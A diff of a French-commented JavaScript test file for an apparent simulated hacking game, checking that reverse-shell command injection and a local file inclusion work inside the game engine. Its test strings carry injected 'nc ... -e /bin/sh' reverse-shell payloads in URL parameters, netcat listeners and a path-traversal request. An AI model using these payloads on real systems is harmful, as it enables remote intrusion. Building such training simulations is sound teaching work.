@@ -450,9 +450,15 @@ section("nc -lvnp : reverse shell manuel comme chemin alternatif", () => {
   const stillNoAccess = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
   assert(stillNoAccess.cls === "t-err", "écoute sur le mauvais port -> toujours pas d'accès");
 
-  run(ctx, "nc -lvnp 4444");
-  const shell = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
-  assert(shell.cls !== "t-err", "écoute sur le bon port + requête -> connexion reçue");
+  // Mécanisme généralisé : le port est parsé depuis le payload, pas câblé en dur.
+  // On prouve qu'un port non standard (9001) fonctionne tant que l'écoute correspond.
+  run(ctx, "nc -lvnp 9001");
+  const badIp = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 9.9.9.9 9001 -e /bin/sh\"");
+  assert(badIp.cls === "t-err", "un callback vers une IP qui n'est pas l'attaquant est refusé");
+  assertEqual(get(ctx, "GAME.progress.meridian.access"), false, "mauvaise IP de callback -> pas d'accès");
+
+  const shell = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 9001 -e /bin/sh\"");
+  assert(shell.cls !== "t-err", "écoute sur un port variable (9001) + bon IP -> connexion reçue");
   assertEqual(get(ctx, "GAME.progress.meridian.access"), true, "l'accès initial est bien marqué via le chemin reverse shell");
   assertEqual(get(ctx, "SESSION.ctx"), "meridian", "la session bascule bien sur meridian après la reverse shell");
   assertEqual(get(ctx, "SESSION.user"), "npatel", "la reverse shell atterrit avec le même utilisateur que ssh (simplification assumée)");
@@ -466,6 +472,32 @@ section("nc -lvnp : reverse shell manuel comme chemin alternatif", () => {
   run(ctx, "ssh npatel@10.10.11.101");
   pass(ctx, "M3r1d1an_Ops#41");
   assertEqual(get(ctx, "GAME.score"), scoreAfterShell, "repasser par ssh après la reverse shell ne recrédite pas les points d'accès");
+});
+
+// ── 11bis. Reverse shell généralisé : même mécanisme réutilisé sur PHANTOM ────
+section("Reverse shell généralisé : altAccess réutilisable (PHANTOM)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use phantom");
+
+  // La LFI normale (?page=...) ne doit PAS être prise pour une injection de commande.
+  const lfi = run(ctx, "curl \"http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak\"");
+  assert(/config\.php\.bak/.test(lfi.text) && lfi.cls !== "t-err", "la LFI classique reste servie normalement (pas confondue avec une injection)");
+  assertEqual(get(ctx, "GAME.progress.phantom.access"), false, "lire un fichier via ?page= ne donne pas d'accès shell");
+
+  // Injection de commande sans écoute -> rien.
+  const noListen = run(ctx, "curl \"http://10.10.11.58/index.php?page=fr.html;nc 10.10.14.1 5555 -e /bin/sh\"");
+  assert(noListen.cls === "t-err", "injection sans écoute préalable -> pas d'accès");
+
+  // Écoute sur un port libre puis déclenchement -> accès obtenu, même code moteur que MERIDIAN.
+  run(ctx, "nc -lvnp 5555");
+  const shell = run(ctx, "curl \"http://10.10.11.58/index.php?page=fr.html;nc 10.10.14.1 5555 -e /bin/sh\"");
+  assert(shell.cls !== "t-err", "écoute + injection -> connexion reçue sur phantom");
+  assertEqual(get(ctx, "GAME.progress.phantom.access"), true, "accès initial marqué sur phantom via reverse shell");
+  assertEqual(get(ctx, "SESSION.ctx"), "phantom", "la session bascule bien sur phantom");
+  assertEqual(get(ctx, "SESSION.user"), "broland", "la reverse shell phantom atterrit sur le bon utilisateur");
+  const flag = run(ctx, "cat user.txt");
+  assert(/FLAG\{phantom_acces_initial/.test(flag.text), "le flag utilisateur phantom est accessible après le reverse shell");
 });
 
 // ── Rapport final ─────────────────────────────────────────────────────────────
